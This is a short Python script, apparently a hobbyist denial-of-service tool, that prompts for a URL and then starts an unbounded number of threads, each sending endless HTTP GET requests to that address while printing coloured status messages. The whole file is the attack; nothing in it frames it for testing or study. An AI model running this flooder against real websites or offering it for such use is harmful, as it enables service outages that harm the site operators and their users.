# -*- coding: utf-8 -*-

import threading
import requests
import colorama
url = input("[url] $ ")
def dos():
	while True:
		try:
			res = requests.get(url)
			print(colorama.Fore.YELLOW + "Request sent! " + colorama.Fore.RED + url) 
		except requests.exceptions.ConnectionError: 
			print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!") 
while True:
	threading.Thread(target=dos).start()
